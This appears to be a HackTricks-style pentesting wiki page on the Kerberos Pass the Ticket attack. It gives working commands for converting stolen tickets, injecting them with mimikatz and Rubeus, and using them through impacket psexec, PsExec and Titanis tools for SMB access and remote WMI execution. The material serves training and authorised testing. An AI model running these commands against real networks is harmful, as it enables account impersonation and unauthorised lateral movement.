# Pass the Ticket

{{#include ../../banners/hacktricks-training.md}}

## Pass The Ticket (PTT)

In the **Pass The Ticket (PTT)** attack method, attackers **steal a user's authentication ticket** instead of their password or hash values. This stolen ticket is then used to **impersonate the user**, gaining unauthorized access to resources and services within a network.

**Read**:

- [Harvesting tickets from Windows](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.md)
- [Harvesting tickets from Linux](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md)

### **Swaping Linux and Windows tickets between platforms**

The [**ticket_converter**](https://github.com/Zer1t0/ticket_converter) tool converts ticket formats using just the ticket itself and an output file.

```bash
python ticket_converter.py velociraptor.ccache velociraptor.kirbi
Converting ccache => kirbi

python ticket_converter.py velociraptor.kirbi velociraptor.ccache
Converting kirbi => ccache
```

In Windows [Kekeo](https://github.com/gentilkiwi/kekeo) can be used.

### Pass The Ticket Attack

```bash:Linux
export KRB5CCNAME=/root/impacket-examples/krb5cc_1120601113_ZFxZpK
python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass
```

```bash:Windows
#Load the ticket in memory using mimikatz or Rubeus
mimikatz.exe "kerberos::ptt [0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi"
.\Rubeus.exe ptt /ticket:[0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi
klist #List tickets in cache to cehck that mimikatz has loaded the ticket
.\PsExec.exe -accepteula \\lab-wdc01.jurassic.park cmd
```

### Titanis Kerberos (PTT/PTK workflows)

Titanis can operate directly with .kirbi or MIT ccache files and request tickets from TGTs, enabling PTT-style access without plaintext passwords.

```bash
# Inspect or convert tickets
Kerb select -From user.kirbi                     # list tickets in a .kirbi
Kerb select -From user.ccache -Into user.kirbi   # convert ccache => kirbi

# Use a TGT to request service tickets
Kerb tgsreq -Kdc dc.domain.local -Tgt user.tgt.kirbi cifs/TARGET, HOST/TARGET -OutputFile user-TARGET.kirbi

# Access SMB and WMI using tickets (no password)
Smb2Client enumshares TARGET -Tgt user.tgt.kirbi -Kdc dc.domain.local
Wmi exec TARGET -Tgt user.tgt.kirbi -Kdc dc.domain.local "whoami /all"

# Or pass specific service tickets
Smb2Client enumshares TARGET -Tickets user-TARGET.kirbi
```

Notes
- For Kerberos across platforms, Titanis accepts both .kirbi and .ccache and can append to output files when requesting multiple TGS.
- When supplying a TGT, specify -Kdc so the client can obtain required service tickets automatically.

## References

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [Titanis repository](https://github.com/trustedsec/Titanis)
- [Titanis Kerb tool docs](https://github.com/trustedsec/Titanis/blob/public/doc/UserGuide/tools/Kerb.md)

{{#include ../../banners/hacktricks-training.md}}
